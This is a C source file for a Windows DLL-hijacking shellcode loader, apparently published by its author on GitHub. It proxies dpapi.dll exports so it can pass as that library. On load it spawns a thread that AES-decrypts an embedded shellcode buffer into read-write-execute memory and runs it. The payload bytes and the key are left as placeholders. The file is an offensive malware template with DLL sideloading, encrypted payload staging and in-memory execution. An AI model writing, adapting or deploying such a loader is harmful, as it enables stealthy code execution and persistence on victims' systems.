// by Abdulaziz Almetairy
// Github.com/oh-az

#pragma comment(linker, "/export:CryptProtectDataNoUI=\"C:\\Windows\\SysWOW64\\dpapi.CryptProtectDataNoUI\"")                                                                         
#pragma comment(linker, "/export:CryptProtectMemory=\"C:\\Windows\\SysWOW64\\dpapi.CryptProtectMemory\"")                                                                             
#pragma comment(linker, "/export:CryptResetMachineCredentials=\"C:\\Windows\\SysWOW64\\dpapi.CryptResetMachineCredentials\"")                                                         
#pragma comment(linker, "/export:CryptUnprotectDataNoUI=\"C:\\Windows\\SysWOW64\\dpapi.CryptUnprotectDataNoUI\"")                                                                     
#pragma comment(linker, "/export:CryptUnprotectMemory=\"C:\\Windows\\SysWOW64\\dpapi.CryptUnprotectMemory\"")                                                                         
#pragma comment(linker, "/export:CryptUpdateProtectedState=\"C:\\Windows\\SysWOW64\\dpapi.CryptUpdateProtectedState\"")                                                               
#pragma comment(linker, "/export:iCryptIdentifyProtection=\"C:\\Windows\\SysWOW64\\dpapi.iCryptIdentifyProtection\"")  

#include "pch.h"
#include <stdio.h>
#include <windows.h>
#include <wincrypt.h>
#pragma comment (lib, "crypt32.lib")


unsigned char mal[] = // Shellcode
unsigned long mal_len = sizeof(mal);



int AESDecrypt(char * pl, unsigned int pl_len, char * key, size_t keylen) {
	HCRYPTPROV hProv;
	HCRYPTHASH hHash;
	HCRYPTKEY hKey;

	if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
		return -1;
	}
	if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
		return -1;
	}
	if (!CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0)) {
		return -1;
	}
	if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) {
		return -1;
	}

	if (!CryptDecrypt(hKey, (HCRYPTHASH)NULL, 0, 0, mal, &mal_len)) {
		return -1;
	}

	CryptReleaseContext(hProv, 0);
	CryptDestroyHash(hHash);
	CryptDestroyKey(hKey);

	return 0;
}



DWORD WINAPI threadFunc(LPVOID lpParameter)
{

	LPVOID allocation;
	HANDLE currentProcess;
	SIZE_T bytesWritten;
	BOOL copyStatus = FALSE;

	char key[] = // Decryption Key

	// Get the current process handle 
	currentProcess = GetCurrentProcess();

	// Allocate memory with Read+Write+Execute permissions 
	allocation = VirtualAllocEx(currentProcess, NULL, 46, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	if (allocation == NULL)
		return -1;

	// Decrypt shellcode
	AESDecrypt((char *)mal, mal_len, key, sizeof(key));

	// Copy the shellcode into the memory we just created 
	copyStatus = WriteProcessMemory(currentProcess, allocation, (LPCVOID)&mal, mal_len, &bytesWritten);

	if (!copyStatus)
		return -2;
	((void(*)())allocation)();

	return 1;
}





BOOL WINAPI
DllMain(HANDLE hDll, DWORD dwReason, LPVOID lpReserved)
{

	HANDLE threadHandle;
	HINSTANCE checkDll;

	switch (dwReason)
	{
	case DLL_PROCESS_ATTACH:
		// Create a thread and close the handle as we do not want to use it to wait for it 
		threadHandle = CreateThread(NULL, 0, threadFunc, NULL, 0, NULL);
		CloseHandle(threadHandle);
		break;

	case DLL_PROCESS_DETACH:
		break;

	case DLL_THREAD_ATTACH:
		break;

	case DLL_THREAD_DETACH:
		break;
	}
	return TRUE;
}

